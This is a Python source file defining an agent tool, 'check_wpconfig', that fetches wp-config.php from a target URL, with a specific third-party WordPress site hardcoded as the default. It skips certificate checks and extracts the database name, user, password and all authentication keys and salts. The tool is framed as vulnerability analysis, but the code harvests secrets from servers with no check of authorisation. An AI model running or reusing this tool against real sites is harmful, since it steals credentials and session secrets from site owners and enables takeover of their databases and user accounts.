from tools.base import Tool
import requests
import re

class CheckWpconfigTool(Tool):
    name = "check_wpconfig"
    description = "Fetches and analyzes the wp-config.php file from a target URL to identify sensitive information and security vulnerabilities."
    parameters = {"url": "Target URL to fetch wp-config.php from"}

    def execute(self, url: str = None, target: str = None, **kwargs) -> str:
        target_url = url or target or kwargs.get('url') or "https://scholarhub.online/wp-config.php"
        try:
            resp = requests.get(target_url, timeout=10, verify=False)
            if resp.status_code == 200:
                content = resp.text
                # Check for sensitive information
                sensitive_info = {
                    "DB_NAME": re.search(r'define\(\s*["]DB_NAME["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "DB_USER": re.search(r'define\(\s*["]DB_USER["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "DB_PASSWORD": re.search(r'define\(\s*["]DB_PASSWORD["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "AUTH_KEY": re.search(r'define\(\s*["]AUTH_KEY["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "SECURE_AUTH_KEY": re.search(r'define\(\s*["]SECURE_AUTH_KEY["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "LOGGED_IN_KEY": re.search(r'define\(\s*["]LOGGED_IN_KEY["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "NONCE_KEY": re.search(r'define\(\s*["]NONCE_KEY["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "AUTH_SALT": re.search(r'define\(\s*["]AUTH_SALT["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "SECURE_AUTH_SALT": re.search(r'define\(\s*["]SECURE_AUTH_SALT["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "LOGGED_IN_SALT": re.search(r'define\(\s*["]LOGGED_IN_SALT["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content),
                    "NONCE_SALT": re.search(r'define\(\s*["]NONCE_SALT["]\s*,\s*["]\s*([^"]+)\s*["]\s*\)', content)
                }
                
                # Prepare the result
                result = {
                    "status": "success",
                    "message": "wp-config.php file fetched and analyzed successfully.",
                    "sensitive_info": {key: match.group(1) if match else "Not found" for key, match in sensitive_info.items()}
                }
                return str(result)
            else:
                return f"Error: Failed to fetch wp-config.php file. HTTP Status Code: {resp.status_code}"
        except requests.exceptions.RequestException as e:
            return f"Error: Request failed: {str(e)}"
        except Exception as e:
            return f"Error: An unexpected error occurred: {str(e)}"